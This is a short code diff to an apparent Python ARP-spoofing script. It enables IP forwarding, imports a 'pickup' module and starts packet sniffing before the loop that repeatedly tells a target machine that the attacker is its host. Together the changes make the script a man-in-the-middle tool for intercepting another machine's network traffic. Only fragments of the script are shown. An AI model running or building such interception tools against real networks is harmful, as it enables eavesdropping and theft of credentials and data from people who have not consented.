@@ -3,6 +3,7 @@ import argparse
 import time
 import os
 import sys
+import pickup
 
 def _enable_linux_iproute():
     """
@@ -96,8 +97,9 @@ if __name__ == "__main__":
     args = parser.parse_args()
     target, host, verbose = args.target, args.host, args.verbose
 
-    # enable_ip_route()
+    enable_ip_route()
     try:
+        pickup.sniffing()
         while True:
             # telling the `target` that we are the `host`
             spoof(target, host, verbose)
@@ -109,6 +111,7 @@ if __name__ == "__main__":
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
         restore(target, host)
         restore(host, target)
+
 
 
 
